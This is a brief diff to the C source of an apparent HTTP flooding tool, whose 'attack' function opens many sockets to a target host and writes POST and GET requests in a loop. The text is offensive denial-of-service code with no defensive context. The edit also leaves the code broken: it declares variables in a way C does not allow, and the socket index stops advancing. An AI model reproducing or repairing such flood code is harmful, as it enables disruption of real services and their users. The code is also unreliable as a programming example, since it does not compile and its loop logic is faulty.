@@ -51,17 +51,17 @@ void broke(int s) {
 
 void attack(char *host, char *port, char *timeEnd, int id) {
 	int sockets[CONNECTIONS];
-	int x, g=1, r;
+	int x, int i, g=1, r;
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
 	while(--timeEnd) {
 		
-		for(x=0; x < PPS; x++) {
+		for(i=0; i < PPS; i++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 19);
-			if(x < PPS) {
+			if(i < PPS) {
 				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 18);
 				
 			} else 
